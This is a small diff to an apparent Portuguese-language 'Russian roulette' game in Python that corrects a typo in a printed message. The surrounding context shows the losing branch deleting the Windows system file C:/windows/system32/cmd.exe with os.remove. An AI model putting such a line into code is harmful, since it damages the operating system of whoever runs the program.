@@ -10,6 +10,6 @@ if es == escolhaUsuario:
     print("Se fudeu!")
     os.remove("C:/windows/system32/cmd.exe")
 else:
-    print(f"voc6e está a salvo! O número errado era {es}")
+    print(f"você está a salvo! O número errado era {es}")
 
 
